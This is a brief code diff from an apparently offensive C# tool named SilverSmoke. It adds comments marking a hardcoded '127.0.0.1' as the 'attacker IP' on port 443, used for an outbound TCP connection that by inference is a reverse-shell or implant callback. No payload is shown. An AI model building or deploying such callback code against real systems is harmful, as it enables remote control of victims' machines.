@@ -20,8 +20,8 @@ namespace SilverSmoke
         static StringBuilder bld;
         public static void InitMethod()
         {
-            string host = "127.0.0.1";
-            int port = 443;
+            string host = "127.0.0.1"; //attacker IP
+            int port = 443; //port
             bld = new StringBuilder();
 
             using (TcpClient client = new TcpClient(host, port)) //establish basic TCP connection
